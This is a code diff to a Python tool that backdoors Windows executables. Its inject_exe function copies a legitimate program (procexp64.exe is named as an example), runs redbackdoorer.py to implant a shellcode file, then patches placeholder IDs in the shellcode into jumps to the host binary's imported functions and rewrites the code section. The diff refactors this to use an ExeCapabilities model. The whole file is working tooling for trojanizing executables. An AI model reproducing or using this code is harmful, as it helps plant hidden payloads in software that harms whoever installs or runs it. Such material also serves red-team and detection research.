@@ -2,13 +2,18 @@ from helper import *
 import shutil
 import pprint
 from pehelper import *
+from model import *
 
-def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities):
+
+def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities: ExeCapabilities):
     print("--[ Injecting: {} into: {} -> {} ]".format(
         shc_file, exe_in, exe_out
     ))
+
+    # create copy of file exe_in to exe_out
     shutil.copyfile(exe_in, exe_out)
 
+    # inject shellcode into exe_out with redbackdoorer
     # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
     subprocess.run([
         "python3.exe",
@@ -16,51 +21,38 @@ def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities):
         mode,
         shc_file,
         exe_out
-    ], check=True,  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-
-    # get code section
-    #   get offset from start of code
-    #   get offset of code setion?
-
-    ####
-    print("-------------")
-    #pprint.pprint(exe_capabilities)
-    for cap in exe_capabilities:
-        print("-> 0x{:X}\t\t{}".format(
-            exe_capabilities[cap]["addr"],
-            cap,
-            #exe_capabilities["id"],
-        ))
-    print("-------------")
+    # get code section of exe_out
     code = get_code_section(exe_out)
 
-    # replace IAT in shellcode
-    for cap in exe_capabilities:
-        #print("AAAA: " + str(cap))
-        if not exe_capabilities[cap]["id"] in code:
+    # replace IAT in shellcode in code
+    # and re-implant it
+    for cap in exe_capabilities.get_all().values():
+        if not cap.id in code:
             print("Not found, abort")
             raise Exception()
         
-        off = code.index(exe_capabilities[cap]["id"])
-        current_address = off + 0x140000000 + 4096
-
-        print(" Off: 0x{:X}".format(off))
-        print(" Off2: 0x{:X}".format(current_address)) # base addr
-        #print(" Diff: 0x{:X}".format())
-
-        destination_address = exe_capabilities[cap]["addr"]
-
+        off = code.index(cap.id)
+        current_address = off + exe_capabilities.image_base + exe_capabilities.text_virtaddr
+        destination_address = cap.addr
+        print("    Replace at 0x{:x} with call to 0x{:x}".format(
+            current_address, destination_address
+        ))
         jmp = assemble_and_disassemble_jump(
             current_address, destination_address
         )
-        print("ONE: {}".format(jmp))
-        print("TWO: {}".format(exe_capabilities[cap]["id"]))
-
-        print("Found! replacing")
-        code = code.replace(
-            exe_capabilities[cap]["id"], jmp)
+        code = code.replace(cap.id, jmp)
         write_code_section(exe_out, code)
+
+        #print(" Off: 0x{:X}".format(off))
+        #print(" Off2: 0x{:X}".format(current_address)) # base addr
+        #print(" Diff: 0x{:X}".format())
+        #print("ONE: {}".format(jmp))
+        #print("TWO: {}".format(cap.id))
+        #print("Found! replacing")
+
+        
 
 
 def verify_injected_exe(exefile):
